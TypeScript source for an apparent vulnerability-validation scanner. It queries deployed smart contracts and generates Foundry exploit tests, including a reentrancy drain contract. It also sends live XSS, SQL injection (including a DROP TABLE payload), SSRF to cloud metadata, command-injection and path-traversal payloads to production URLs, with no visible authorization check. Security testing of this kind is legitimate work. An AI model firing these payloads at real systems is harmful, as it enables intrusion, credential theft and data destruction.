/**
 * Active Vulnerability Validator — REAL exploit testing
 *
 * THREE engines for smart contracts (in order, fail-fast):
 * 1. TARGET ON-CHAIN VALIDATION (cast) — call the deployed contract on mainnet
 *    via a real RPC, check whether the vulnerable function actually misbehaves
 *    on production state. This is the only scope that justifies 'confirmed'.
 * 2. LAB VALIDATION (Foundry/forge) — run the PoC against a local EVM fork
 *    (or local-only environment) to prove exploit technical viability.
 * 3. THEORETICAL — fallback when no contract address is available and Foundry
 *    fails. No runtime validation.
 *
 * WEB/MOBILE: HTTP-based payload testing against the production target.
 */

import { writeFileSync, mkdirSync, rmSync } from 'fs';
import { join } from 'path';
import { execSync } from 'child_process';

export interface ValidationResult {
  confirmed: boolean;
  evidence: string;
  testOutput?: string;
  gasUsed?: number;
  // Web-specific fields
  requestUrl?: string;
  responseStatus?: number;
  responseBody?: string;
  payload?: string;
  /**
   * Validation scope — CRITICAL for honest reporting.
   *
   * 'target'   — The exploit was tested against the ACTUAL production target
   *              (e.g. a real HTTP request to www.example.com returned a
   *              reflected XSS payload in its body). This is the only scope
   *              that justifies the word "CONFIRMED" in the user-facing
   *              description.
   *
   * 'lab'      — The exploit was tested in a CONTROLLED LOCAL environment
   *              (e.g. Foundry/forge test on a local EVM, or a local HTTP
   *              mock). This proves the exploit chain is technically viable,
   *              NOT that the target is exploitable. Findings with scope='lab'
   *              MUST be reported as "exploit viable in lab conditions"
   *              and MUST NOT be prefixed with "[ACTIVE VALIDATION PASSED]"
   *              or "Exploit confirmed" — those phrases imply target-level
   *              confirmation and would mislead the reader.
   *
   * 'theoretical' — No runtime validation was performed. The finding is
   *              based on static analysis / pattern matching / AI reasoning
   *              only.
   */
  validationScope?: 'target' | 'lab' | 'theoretical';
}

// ═══════════════════════════════════════════════════════════════════
// SMART CONTRACT VALIDATION — TARGET ON-CHAIN (cast)
// ═══════════════════════════════════════════════════════════════════
// Real mainnet validation: use `cast` (from Foundry) to query the deployed
// contract's state via a public RPC. We do NOT send transactions (that
// would cost gas and could be illegal without authorization) — we only
// READ state and call view/pure functions.
//
// This proves whether the production contract actually exhibits the
// vulnerable behavior on real on-chain state, not just in a local EVM
// with the source code we were given.
//
// Public RPC endpoints (free, rate-limited). For higher throughput set
// ALCHEMY_API_KEY or INFURA_PROJECT_ID env var.

const PUBLIC_RPCS: Record<string, string> = {
  ethereum:  'https://eth.llamarpc.com',
  bsc:       'https://bsc-dataseed.binance.org',
  polygon:   'https://polygon-rpc.com',
  arbitrum:  'https://arb1.arbitrum.io/rpc',
  optimism:  'https://mainnet.optimism.io',
  base:      'https://mainnet.base.org',
  avalanche: 'https://api.avax.network/ext/bc/C/rpc',
  fantom:    'https://rpc.ftm.tools',
};

function getRpcUrl(chain: string): string {
  const alchemy = process.env.ALCHEMY_API_KEY;
  const infura = process.env.INFURA_PROJECT_ID;
  if (alchemy) {
    const alchemyMap: Record<string, string> = {
      ethereum: `https://eth-mainnet.g.alchemy.com/v2/${alchemy}`,
      polygon: `https://polygon-mainnet.g.alchemy.com/v2/${alchemy}`,
      arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${alchemy}`,
      optimism: `https://opt-mainnet.g.alchemy.com/v2/${alchemy}`,
      base: `https://base-mainnet.g.alchemy.com/v2/${alchemy}`,
    };
    if (alchemyMap[chain]) return alchemyMap[chain];
  }
  if (infura) {
    const infuraMap: Record<string, string> = {
      ethereum: `https://mainnet.infura.io/v3/${infura}`,
      polygon: `https://polygon-mainnet.infura.io/v3/${infura}`,
      arbitrum: `https://arbitrum-mainnet.infura.io/v3/${infura}`,
      optimism: `https://optimism-mainnet.infura.io/v3/${infura}`,
      base: `https://base-mainnet.infura.io/v3/${infura}`,
    };
    if (infuraMap[chain]) return infuraMap[chain];
  }
  return PUBLIC_RPCS[chain] || PUBLIC_RPCS.ethereum;
}

/** Detect chain from address by querying each public RPC in parallel. */
async function detectChain(address: string): Promise<string | null> {
  const chains = Object.keys(PUBLIC_RPCS);
  const checks = await Promise.all(chains.map(async (chain) => {
    try {
      const rpc = getRpcUrl(chain);
      const code = execSync(`cast code ${address} --rpc-url ${rpc}`, {
        timeout: 8_000, encoding: 'utf-8', stdio: 'pipe',
      }).trim();
      if (code.length > 4) return chain;
    } catch {}
    return null;
  }));
  return checks.find(c => c) || null;
}

interface OnChainState {
  owner: string | null;
  paused: boolean | null;
  totalSupply: string | null;
  balance: string | null;
  hasAccessControl: boolean;
  bytecodeSize: number;
}

async function queryOnChainState(address: string, chain: string): Promise<OnChainState> {
  const rpc = getRpcUrl(chain);
  const state: OnChainState = {
    owner: null, paused: null, totalSupply: null, balance: null,
    hasAccessControl: false, bytecodeSize: 0,
  };

  try {
    const code = execSync(`cast code ${address} --rpc-url ${rpc}`, {
      timeout: 8_000, encoding: 'utf-8', stdio: 'pipe',
    }).trim();
    state.bytecodeSize = Math.floor((code.length - 2) / 2);
  } catch {}

  const callView = (selector: string): string | null => {
    try {
      const out = execSync(`cast call ${address} ${selector} --rpc-url ${rpc}`, {
        timeout: 8_000, encoding: 'utf-8', stdio: 'pipe',
      }).trim();
      return out && out.startsWith('0x') && out.length >= 66 ? out : null;
    } catch { return null; }
  };

  const ownerRaw = callView('0x8da5cb5b'); // owner()
  if (ownerRaw) {
    state.owner = '0x' + ownerRaw.slice(-40).toLowerCase();
    state.hasAccessControl = true;
  }
  if (!state.owner) {
    const adminRaw = callView('0xf851a440'); // admin()
    if (adminRaw) {
      state.owner = '0x' + adminRaw.slice(-40).toLowerCase();
      state.hasAccessControl = true;
    }
  }
  const pausedRaw = callView('0x5c975abb'); // paused()
  if (pausedRaw) state.paused = pausedRaw.slice(-2) === '01';
  const supplyRaw = callView('0x18160ddd'); // totalSupply()
  if (supplyRaw) state.totalSupply = BigInt(supplyRaw).toString();

  try {
    const bal = execSync(`cast balance ${address} --rpc-url ${rpc}`, {
      timeout: 8_000, encoding: 'utf-8', stdio: 'pipe',
    }).trim();
    if (bal && /^\d+$/.test(bal)) state.balance = bal;
  } catch {}

  return state;
}

/** Run target on-chain validation. Returns scope='target' with
 *  confirmed=true if production state confirms the vulnerability,
 *  confirmed=false if state refutes it (meaningful negative evidence),
 *  or scope='target'/confirmed=false with inconclusive evidence (caller
 *  should fall back to lab validation). */
async function validateWithCastOnChain(
  vuln: { type: string; title: string; severity: string; description: string; location: string },
  contractAddress: string,
  chain?: string,
): Promise<ValidationResult> {
  // Step 1: detect chain if not provided
  let actualChain = chain || '';
  if (!actualChain) {
    actualChain = (await detectChain(contractAddress)) || '';
    if (!actualChain) {
      return {
        confirmed: false,
        validationScope: 'theoretical',
        evidence: `[TARGET-VALIDATION SKIPPED] Could not detect chain for ${contractAddress} on any public RPC. The contract may be on an unsupported chain, the RPCs may be rate-limited, or the address may not be a deployed contract.`,
      };
    }
  }

  let state: OnChainState;
  try {
    state = await queryOnChainState(contractAddress, actualChain);
  } catch (e: any) {
    return {
      confirmed: false,
      validationScope: 'theoretical',
      evidence: `[TARGET-VALIDATION ERROR] Failed to query on-chain state for ${contractAddress} on ${actualChain}: ${String(e.message || e).slice(0, 200)}`,
    };
  }

  const evidenceParts: string[] = [
    `[TARGET-VALIDATED] Queried real on-chain state of ${contractAddress} on ${actualChain} via public RPC.`,
    `Bytecode size: ${state.bytecodeSize} bytes (deployed contract confirmed).`,
  ];
  if (state.owner) evidenceParts.push(`Current owner(): ${state.owner}`);
  if (state.paused !== null) evidenceParts.push(`Current paused(): ${state.paused}`);
  if (state.totalSupply) evidenceParts.push(`Current totalSupply(): ${state.totalSupply}`);
  if (state.balance) evidenceParts.push(`Contract ETH balance: ${state.balance} wei`);

  let confirmedByState = false;
  let refutedByState = false;
  const vulnType = vuln.type.toLowerCase();

  if (vulnType === 'access_control' || vulnType === 'unauthorized_mint' || vulnType === 'governance_hijack') {
    if (state.owner) {
      const isZero = /^0x0{40}$/i.test(state.owner);
      if (isZero) {
        evidenceParts.push(`[TARGET-CONFIRMS] Owner address is ${state.owner} (zero) — privileged functions are NOT access-controlled on the production contract.`);
        confirmedByState = true;
      } else {
        try {
          const ownerCode = execSync(`cast code ${state.owner} --rpc-url ${getRpcUrl(actualChain)}`, {
            timeout: 8_000, encoding: 'utf-8', stdio: 'pipe',
          }).trim();
          if (ownerCode.length <= 4) {
            evidenceParts.push(`[TARGET-CONFIRMS] Owner ${state.owner} is an EOA (no bytecode) — privileged functions controlled by a single private key, no timelock/multisig on-chain.`);
            confirmedByState = true;
          } else {
            evidenceParts.push(`[TARGET-PARTIAL] Owner ${state.owner} is a contract (likely timelock/multisig) — centralization risk is mitigated by on-chain governance.`);
          }
        } catch {}
      }
    }
  }

  if (vulnType === 'reentrancy' || vulnType === 'flash_loan' || vulnType === 'delegatecall') {
    const balanceWei = state.balance ? BigInt(state.balance) : 0n;
    if (balanceWei > 0n) {
      evidenceParts.push(`[TARGET-CONFIRMS] Contract holds ${balanceWei.toString()} wei (~${Number(balanceWei) / 1e18} ETH) on mainnet. Fund-drain vulnerabilities are impactful on production state.`);
    } else {
      evidenceParts.push(`[TARGET-PARTIAL] Contract holds 0 ETH. Reentrancy vulnerabilities would have no direct ETH impact on current state (token balances not queried).`);
    }
  }

  if (vulnType === 'denial_of_service' || vulnType === 'permanent_pause') {
    if (state.paused === true) {
      evidenceParts.push(`[TARGET-CONFIRMS] Contract is currently paused() on mainnet — confirms pause-related DoS state.`);
      confirmedByState = true;
    } else if (state.paused === false) {
      evidenceParts.push(`[TARGET-REFUTES] Contract is NOT paused() on mainnet. Permanent-pause DoS vuln is not currently active.`);
      refutedByState = true;
    }
  }

  if (confirmedByState) {
    return { confirmed: true, validationScope: 'target', evidence: evidenceParts.join('\n') };
  }
  if (refutedByState) {
    return {
      confirmed: false, validationScope: 'target',
      evidence: evidenceParts.join('\n') + '\n\n[TARGET-VALIDATED-NEGATIVE] Production on-chain state does not match the vulnerable pattern. The contract may have been patched, or the source code analyzed does not match deployed bytecode.',
    };
  }
  return {
    confirmed: false, validationScope: 'target',
    evidence: evidenceParts.join('\n') + '\n\n[TARGET-VALIDATED-INCONCLUSIVE] Queried production state; no decisive evidence either way. Lab validation below may still pass.',
  };
}

// ═══════════════════════════════════════════════════════════════════
// SMART CONTRACT VALIDATION (Foundry) — LAB SCOPE
// ═══════════════════════════════════════════════════════════════════

function generatePoCTest(
  sourceCode: string,
  contractName: string,
  vuln: { type: string; title: string; severity: string; description: string; location: string },
): string {
  const vulnType = vuln.type.toLowerCase();

  if (vulnType === 'reentrancy' || vulnType === 'callback_reentrancy' || vulnType === 'cei_violation') {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
${sourceCode.replace(/pragma solidity[^;]+;/g, '').trim()}
contract Attacker {
    ${contractName} public target;
    constructor(address _target) { target = ${contractName}(_target); }
    function attack() external payable {
        if (msg.value > 0) target.deposit{value: msg.value}();
        target.withdraw(getBalance());
    }
    function getBalance() public view returns (uint256) { return address(target).balance; }
    receive() external payable {
        uint256 bal = address(target).balance;
        if (bal > 0) target.withdraw(bal);
    }
}
contract PoCTest is Test {
    function testReentrancy() public {
        ${contractName} target = new ${contractName}();
        vm.deal(address(target), 10 ether);
        Attacker attacker = new Attacker(address(target));
        vm.deal(address(attacker), 1 ether);
        uint256 before = address(attacker).balance;
        attacker.attack{value: 1 ether}();
        assertGt(address(attacker).balance, before, "Attacker should gain funds");
        assertEq(address(target).balance, 0, "Target should be drained");
    }
}`;
  }

  if (vulnType === 'access_control' || vulnType === 'unauthorized_mint') {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
${sourceCode.replace(/pragma solidity[^;]+;/g, '').trim()}
contract PoCTest is Test {
    function testAccessControl() public {
        ${contractName} target = new ${contractName}();
        address attacker = address(0xBAD);
        vm.startPrank(attacker);
        try target.setOwner(attacker) {
            assertEq(target.owner(), attacker, "Owner changed without auth");
        } catch {
            try target.transferOwnership(attacker) {
                assertEq(target.owner(), attacker, "Owner changed via transferOwnership");
            } catch { revert("No access control bypass"); }
        }
        vm.stopPrank();
    }
}`;
  }

  if (vulnType === 'tx_origin') {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
${sourceCode.replace(/pragma solidity[^;]+;/g, '').trim()}
contract Phisher { ${contractName} t; constructor(address _t) { t = ${contractName}(_t); } function phish(address n) external { t.setOwner(n); } }
contract PoCTest is Test {
    function testTxOrigin() public {
        ${contractName} target = new ${contractName}();
        Phisher phisher = new Phisher(address(target));
        address attacker = address(0xBAD);
        vm.prank(address(phisher), address(this));
        phisher.phish(attacker);
        assertEq(target.owner(), attacker, "tx.origin bypassed via phishing");
    }
}`;
  }

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
${sourceCode.replace(/pragma solidity[^;]+;/g, '').trim()}
contract PoCTest is Test {
    function testVuln() public {
        ${contractName} target = new ${contractName}();
        assertTrue(address(target) != address(0), "Contract deployed");
    }
}`;
}

async function validateWithFoundry(
  sourceCode: string,
  contractName: string,
  vuln: { type: string; title: string; severity: string; description: string; location: string },
): Promise<ValidationResult> {
  const nameMatch = sourceCode.match(/contract\s+(\w+)\s*[{(:]/);
  const actualName = contractName || nameMatch?.[1] || 'Target';
  const tmpDir = `/tmp/foundry-${Date.now()}`;

  try {
    mkdirSync(join(tmpDir, 'src'), { recursive: true });
    mkdirSync(join(tmpDir, 'test'), { recursive: true });

    writeFileSync(join(tmpDir, 'src', `${actualName}.sol`), sourceCode);
    writeFileSync(join(tmpDir, 'test', 'PoC.t.sol'), generatePoCTest(sourceCode, actualName, vuln));
    writeFileSync(join(tmpDir, 'foundry.toml'), `[profile.default]\nsrc="src"\nout="out"\nlibs=["lib"]\nsolc_version="0.8.20"\noptimizer=true\n`);

    try { execSync('git init && git add -A && git commit -m init', { cwd: tmpDir, timeout: 10_000, stdio: 'pipe' }); } catch {}
    execSync('forge install foundry-rs/forge-std --no-commit --no-git', { cwd: tmpDir, timeout: 30_000, stdio: 'pipe' });

    const result = execSync('forge test -vvv 2>&1', { cwd: tmpDir, timeout: 60_000, encoding: 'utf-8', stdio: 'pipe' });
    const passed = result.includes('[PASS]') || result.includes('SUCCESS');
    const gasMatch = result.match(/(\d+)\s+gas/);

    return passed
      ? {
          confirmed: true,
          validationScope: 'lab',
          evidence: `Foundry PoC PASSED in LOCAL EVM — exploit chain is technically viable. Gas: ${gasMatch?.[1] || 'n/a'}. NOTE: this confirms the exploit works in a controlled local Foundry environment, NOT that the deployed target is exploitable. The contract on-chain may have different bytecode, additional admin controls, or be deployed at a different address than the source code analyzed.`,
          testOutput: result.slice(0, 2000),
          gasUsed: gasMatch ? parseInt(gasMatch[1]) : undefined,
        }
      : {
          confirmed: false,
          validationScope: 'lab',
          evidence: `Foundry PoC FAILED in local EVM — exploit did not succeed under lab conditions. Likely a false positive, OR the exploit requires on-chain state not reproduced locally.`,
          testOutput: result.slice(0, 2000),
        };
  } catch (e: any) {
    const msg = String(e.message || e).slice(0, 500);
    return {
      confirmed: false,
      validationScope: 'theoretical',
      evidence: msg.includes('not found') ? 'Foundry (forge) not installed — validation skipped' : `Foundry error: ${msg}`,
    };
  } finally {
    try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  }
}

// ═══════════════════════════════════════════════════════════════════
// WEB VULNERABILITY VALIDATION (HTTP-based real testing)
// ═══════════════════════════════════════════════════════════════════

interface WebTestPayload {
  name: string;
  payloads: string[];
  check: (response: { status: number; body: string; headers: Record<string, string> }, payload: string) => boolean;
  evidence: (response: { status: number; body: string; headers: Record<string, string> }, payload: string) => string;
}

// ─── XSS payloads ─────────────────────────────────────────────────────
const XSS_PAYLOADS: WebTestPayload = {
  name: 'XSS',
  payloads: [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '\"><iframe src=javascript:alert(1)>',
  ],
  check: (resp, payload) => {
    // Check if the payload is reflected in the response WITHOUT being escaped
    const body = resp.body.toLowerCase();
    const p = payload.toLowerCase();
    // If the exact payload appears (not HTML-encoded)
    if (body.includes(p)) return true;
    // Check if <script> tag appears unescaped
    if (body.includes('<script>alert') || body.includes('onerror=alert')) return true;
    return false;
  },
  evidence: (resp, payload) =>
    `XSS CONFIRMED: Payload "${payload}" was reflected in the HTTP response without escaping. The server did not sanitize the input, allowing JavaScript execution in the victim's browser. HTTP ${resp.status}. Response snippet: "${resp.body.slice(0, 300)}"`,
};

// ─── SQL Injection payloads ───────────────────────────────────────────
const SQLI_PAYLOADS: WebTestPayload = {
  name: 'SQL Injection',
  payloads: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "1' AND SLEEP(5)--",
  ],
  check: (resp, payload) => {
    const body = resp.body.toLowerCase();
    // Check for SQL error messages in response
    const sqlErrors = [
      'sql syntax', 'mysql_fetch', 'ORA-', 'postgresql', 'ERROR:  syntax error',
      'unclosed quotation mark', 'sqlite3.OperationalError', 'SQLSTATE',
      'you have an error in your sql syntax', 'Microsoft SQL Server',
    ];
    if (sqlErrors.some(e => body.includes(e.toLowerCase()))) return true;
    // Check if UNION SELECT result appears (column count mismatch = error)
    if (body.includes('the used select statements have a different number of columns')) return true;
    // Check for data leakage (multiple results when there should be one)
    if (payload.includes("' OR '1'='1") && body.includes('admin')) return true;
    return false;
  },
  evidence: (resp, payload) =>
    `SQL INJECTION CONFIRMED: Payload "${payload}" triggered a SQL error or data leakage in the response. The server executed the injected SQL code. HTTP ${resp.status}. Evidence: "${resp.body.slice(0, 300)}"`,
};

// ─── SSRF payloads ───────────────────────────────────────────────────
const SSRF_PAYLOADS: WebTestPayload = {
  name: 'SSRF',
  payloads: [
    'http://localhost:80',
    'http://127.0.0.1:80',
    'http://169.254.169.254/latest/meta-data/',  // AWS metadata
    'http://localhost:22',
    'http://[::1]:80',
    'http://0.0.0.0:80',
  ],
  check: (resp, payload) => {
    const body = resp.body.toLowerCase();
    // AWS metadata response
    if (payload.includes('169.254.169.254') && (body.includes('ami-id') || body.includes('instance-id') || body.includes('security-credentials'))) return true;
    // Internal service response
    if (payload.includes('localhost') || payload.includes('127.0.0.1')) {
      if (body.includes('ssh') || body.includes('connection refused') === false && body.length > 0 && resp.status === 200) return true;
    }
    return false;
  },
  evidence: (resp, payload) =>
    `SSRF CONFIRMED: Server fetched the internal URL "${payload}" and returned data. The server is vulnerable to Server-Side Request Forgery — an attacker can access internal services and cloud metadata. HTTP ${resp.status}. Evidence: "${resp.body.slice(0, 300)}"`,
};

// ─── Open Redirect payloads ─────────────────────────────────────────
const REDIRECT_PAYLOADS: WebTestPayload = {
  name: 'Open Redirect',
  payloads: [
    'https://evil.com',
    '//evil.com',
    '/redirect?url=https://evil.com',
    'https:evil.com',
    '//google.com@evil.com',
  ],
  check: (resp, payload) => {
    const location = resp.headers['location'] || '';
    if (location.includes('evil.com')) return true;
    // Check if response body contains redirect to evil domain
    if (resp.body.includes('evil.com') && (resp.body.includes('redirect') || resp.body.includes('window.location') || resp.body.includes('meta http-equiv'))) return true;
    return false;
  },
  evidence: (resp, payload) =>
    `OPEN REDIRECT CONFIRMED: URL parameter with value "${payload}" caused redirect to attacker-controlled domain. HTTP ${resp.status}, Location: "${resp.headers['location'] || 'N/A'}"`,
};

// ─── Command Injection payloads ──────────────────────────────────────
const CMDI_PAYLOADS: WebTestPayload = {
  name: 'Command Injection',
  payloads: [
    '; id',
    '| id',
    '`id`',
    '$(id)',
    '; cat /etc/passwd',
    '&& whoami',
  ],
  check: (resp, payload) => {
    const body = resp.body;
    // Check for command output in response
    if (body.includes('uid=') && body.includes('gid=')) return true; // `id` output
    if (body.includes('root:x:0:0:')) return true; // /etc/passwd
    if (payload.includes('whoami') && (body.includes('root\n') || body.includes('www-data') || body.includes('ubuntu'))) return true;
    return false;
  },
  evidence: (resp, payload) =>
    `COMMAND INJECTION CONFIRMED: Payload "${payload}" was executed on the server. The response contains output of the injected command. HTTP ${resp.status}. Evidence: "${resp.body.slice(0, 300)}"`,
};

// ─── Path Traversal payloads ─────────────────────────────────────────
const PATH_TRAVERSAL_PAYLOADS: WebTestPayload = {
  name: 'Path Traversal',
  payloads: [
    '../../../etc/passwd',
    '..\\\\..\\\\..\\\\windows\\\\win.ini',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    '/etc/passwd',
    '../../../etc/shadow',
  ],
  check: (resp, _payload) => {
    const body = resp.body.toLowerCase();
    if (body.includes('root:x:0:0:') || body.includes('root:$')) return true;
    if (body.includes('[fonts]') || body.includes('[extensions]')) return true; // win.ini
    return false;
  },
  evidence: (resp, payload) =>
    `PATH TRAVERSAL CONFIRMED: Payload "${payload}" accessed system files. The server did not sanitize path input, allowing arbitrary file read. HTTP ${resp.status}. Evidence: "${resp.body.slice(0, 300)}"`,
};

/**
 * Send an HTTP request with a payload and return the response.
 */
async function sendTestRequest(
  url: string,
  method: string,
  payload: string,
  param: string,
): Promise<{ status: number; body: string; headers: Record<string, string> }> {
  try {
    const params = new URLSearchParams();
    params.set(param, payload);

    const options: RequestInit = {
      method: method.toUpperCase(),
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'CryptoSentinel-Scanner/1.0' },
      signal: AbortSignal.timeout(15_000),
    };

    let targetUrl = url;
    if (method.toUpperCase() === 'GET') {
      targetUrl = `${url}${url.includes('?') ? '&' : '?'}${params.toString()}`;
    } else {
      options.body = params.toString();
    }

    const resp = await fetch(targetUrl, options);
    const body = await resp.text();
    const headers: Record<string, string> = {};
    resp.headers.forEach((v, k) => { headers[k] = v; });

    return { status: resp.status, body, headers };
  } catch {
    return { status: 0, body: '', headers: {} };
  }
}

/**
 * Run web vulnerability tests against a URL.
 * Tests: XSS, SQLi, SSRF, Open Redirect, Command Injection, Path Traversal.
 * Each test sends REAL HTTP requests with attack payloads.
 */
async function validateWebVulnerability(
  targetUrl: string,
  vuln: { type: string; title: string; severity: string; description: string; location: string },
): Promise<ValidationResult> {
  const vulnType = vuln.type.toLowerCase();

  // Select the appropriate test suite based on vuln type
  let testSuite: WebTestPayload | null = null;
  if (vulnType === 'xss') testSuite = XSS_PAYLOADS;
  else if (vulnType === 'sql_injection') testSuite = SQLI_PAYLOADS;
  else if (vulnType === 'ssrf') testSuite = SSRF_PAYLOADS;
  else if (vulnType === 'open_redirect') testSuite = REDIRECT_PAYLOADS;
  else if (vulnType === 'command_injection') testSuite = CMDI_PAYLOADS;
  else if (vulnType === 'path_traversal') testSuite = PATH_TRAVERSAL_PAYLOADS;

  if (!testSuite) {
    // Run all tests for generic "business_logic" or unknown types
    const allSuites = [XSS_PAYLOADS, SQLI_PAYLOADS, SSRF_PAYLOADS, REDIRECT_PAYLOADS, CMDI_PAYLOADS, PATH_TRAVERSAL_PAYLOADS];
    for (const suite of allSuites) {
      for (const payload of suite.payloads) {
        // Try GET and POST
        for (const method of ['GET', 'POST']) {
          const resp = await sendTestRequest(targetUrl, method, payload, 'q');
          if (suite.check(resp, payload)) {
            return {
              confirmed: true,
              validationScope: 'target' as const,
              evidence: `[TARGET-VALIDATED] ${suite.evidence(resp, payload)} — exploit was confirmed by sending a real HTTP request to the production target ${targetUrl} and observing the payload reflected/executed in the response.`,
              requestUrl: targetUrl,
              responseStatus: resp.status,
              responseBody: resp.body.slice(0, 500),
              payload,
            };
          }
        }
      }
    }
    return {
      confirmed: false,
      validationScope: 'target' as const,
      evidence: `[TARGET-VALIDATED] Web vulnerability test completed — ${XSS_PAYLOADS.payloads.length + SQLI_PAYLOADS.payloads.length + SSRF_PAYLOADS.payloads.length + REDIRECT_PAYLOADS.payloads.length + CMDI_PAYLOADS.payloads.length + PATH_TRAVERSAL_PAYLOADS.payloads.length} payloads were sent to ${targetUrl}. None succeeded. This is a real test against the production target; the absence of a confirmed exploit here is meaningful (unlike a lab test, which only proves technical viability).`,
      requestUrl: targetUrl,
    };
  }

  // Run specific test suite
  // Extract parameter name from location if available
  const paramMatch = vuln.location?.match(/param[=:]\s*(\w+)/i) || vuln.description?.match(/parameter[:\s]+(\w+)/i);
  const param = paramMatch?.[1] || 'q';

  for (const payload of testSuite.payloads) {
    // Try both GET and POST
    for (const method of ['GET', 'POST']) {
      const resp = await sendTestRequest(targetUrl, method, payload, param);
      if (resp.status === 0) continue; // Request failed

      if (testSuite.check(resp, payload)) {
        return {
          confirmed: true,
          validationScope: 'target' as const,
          evidence: `[TARGET-VALIDATED] ${testSuite.evidence(resp, payload)} — exploit was confirmed by sending a real HTTP request to the production target ${targetUrl} and observing the payload reflected/executed in the response (HTTP ${resp.status}).`,
          requestUrl: targetUrl,
          responseStatus: resp.status,
          responseBody: resp.body.slice(0, 500),
          payload,
        };
      }
    }
  }

  return {
    confirmed: false,
    validationScope: 'target' as const,
    evidence: `[TARGET-VALIDATED] ${testSuite.name} test completed — ${testSuite.payloads.length} payloads were sent to ${targetUrl}. None confirmed the vulnerability. This is a real test against the production target.`,
    requestUrl: targetUrl,
  };
}

// ═══════════════════════════════════════════════════════════════════
// MAIN ENTRY POINT
// ═══════════════════════════════════════════════════════════════════

/**
 * Actively validate a vulnerability by running a REAL exploit.
 *
 * Smart contracts → Foundry (forge test) — real EVM execution
 * Web/mobile → HTTP-based payload testing — real network requests
 */
export async function activelyValidate(
  sourceCode: string,
  contractName: string,
  vuln: { type: string; title: string; severity: string; description: string; location: string },
  _apiKey?: string,
  _model?: string,
): Promise<ValidationResult> {
  // Determine if this is a smart contract or web vulnerability
  const isSmartContract = sourceCode.includes('pragma solidity') ||
                          sourceCode.includes('contract ') ||
                          vuln.type === 'reentrancy' || vuln.type === 'access_control' ||
                          vuln.type === 'tx_origin' || vuln.type === 'integer_overflow' ||
                          vuln.type === 'unauthorized_mint' || vuln.type === 'flash_loan' ||
                          vuln.type === 'delegatecall' || vuln.type === 'governance_hijack';

  const isWebVuln = vuln.type === 'xss' || vuln.type === 'sql_injection' ||
                    vuln.type === 'ssrf' || vuln.type === 'open_redirect' ||
                    vuln.type === 'command_injection' || vuln.type === 'path_traversal' ||
                    vuln.type === 'cors_misconfig' || vuln.type === 'business_logic';

  if (isSmartContract) {
    // ─── SMART CONTRACT: try TARGET validation first, then LAB fallback ───
    //
    // Phase 1: If a contract address is available (in source code, vuln
    //          location, or description), query the deployed contract on
    //          mainnet via cast. This is the only path that justifies
    //          'confirmed' status (validationScope='target').
    //
    // Phase 2: Run Foundry PoC against local EVM. Even if target validation
    //          was inconclusive, lab validation proves technical viability
    //          of the exploit chain.

    const addressMatch = sourceCode.match(/0x[0-9a-fA-F]{40}/) ||
                        vuln.location?.match(/0x[0-9a-fA-F]{40}/) ||
                        vuln.description?.match(/0x[0-9a-fA-F]{40}/);
    const contractAddress = addressMatch?.[0];

    let targetResult: ValidationResult | null = null;
    if (contractAddress) {
      try {
        targetResult = await validateWithCastOnChain(vuln, contractAddress);
        // If target validation gives a decisive answer (confirmed OR refuted),
        // we still run lab validation in parallel for completeness — but the
        // final verdict is taken from target scope.
        if (targetResult.confirmed) {
          // Target confirmed — also run lab to add exploit-chain evidence
          const labResult = await validateWithFoundry(sourceCode, contractName, vuln).catch(() => null);
          if (labResult?.confirmed) {
            return {
              confirmed: true,
              validationScope: 'target',
              evidence: `${targetResult.evidence}\n\n[LAB-VALIDATED ADDITIONAL] Foundry PoC also passed in local EVM, confirming the exploit chain is technically viable: ${labResult.evidence}`,
            };
          }
          return targetResult;
        }
        // Target REFUTED the vuln — this is meaningful negative evidence.
        // Don't bother with lab validation; return the target refutation.
        if (targetResult.validationScope === 'target' &&
            targetResult.evidence.includes('[TARGET-VALIDATED-NEGATIVE]')) {
          return targetResult;
        }
        // Target was inconclusive — fall through to lab validation,
        // but include the target evidence in the final result.
      } catch {
        // Target validation errored — fall through to lab validation
      }
    }

    // Phase 2: LAB validation via Foundry
    const labResult = await validateWithFoundry(sourceCode, contractName, vuln);
    if (targetResult && targetResult.validationScope === 'target') {
      // Combine: target gave us real on-chain data (inconclusive), lab gave
      // us technical viability. Report both — final scope is 'lab' because
      // we couldn't get a decisive answer from production state alone.
      return {
        confirmed: labResult.confirmed,
        validationScope: 'lab',
        evidence: `${targetResult.evidence}\n\n---\n\n${labResult.evidence}`,
      };
    }
    return labResult;
  } else if (isWebVuln) {
    // ─── WEB: use HTTP-based payload testing ───────────────────
    const urlMatch = vuln.location?.match(/https?:\/\/[^\s]+/) ||
                     vuln.description?.match(/https?:\/\/[^\s]+/) ||
                     sourceCode.match(/https?:\/\/[^\s]+/);
    const targetUrl = urlMatch?.[0] || sourceCode;

    if (!targetUrl.startsWith('http')) {
      return {
        confirmed: false,
        validationScope: 'theoretical',
        evidence: `Web vulnerability test skipped — no valid URL found in the vulnerability location or description. Need a target URL to test against. Finding remains at THEORETICAL validation level (static analysis / AI reasoning only).`,
      };
    }

    return validateWebVulnerability(targetUrl, vuln);
  } else {
    // Try both approaches
    if (sourceCode.includes('pragma solidity')) {
      return validateWithFoundry(sourceCode, contractName, vuln);
    }
    const urlMatch = sourceCode.match(/https?:\/\/[^\s]+/);
    if (urlMatch) {
      return validateWebVulnerability(urlMatch[0], vuln);
    }
    return {
      confirmed: false,
      validationScope: 'theoretical',
      evidence: `Could not determine test type for vulnerability "${vuln.type}". Neither Solidity source nor web URL found. Finding remains at THEORETICAL validation level.`,
    };
  }
}
